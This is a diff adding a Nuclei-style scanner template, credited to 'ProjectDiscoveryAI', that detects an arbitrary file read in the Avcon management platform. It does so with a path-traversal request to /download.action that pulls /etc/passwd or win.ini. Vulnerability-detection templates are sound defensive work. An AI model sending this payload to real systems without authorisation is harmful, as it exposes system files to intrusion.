@@ -1,0 +1,38 @@
+id: avcon-download-action-anyfile-read
+
+info:
+  name: Avcon综合管理平台 Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+variables:
+  files:
+    - "../etc/passwd"
+    - "c:/windows/win.ini"
+
+http:
+  - raw:
+      - |
+        GET /download.action?filename=../../../../../../../{{files}} HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    payloads:
+      files:
+        - "../etc/passwd"
+        - "c:/windows/win.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        condition: or
+        words:
+          - "root:"
+          - "bit app support"
+          - "[files]"
+      - type: regex
+        part: header
+        regex:
+          - 'filename="\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/'
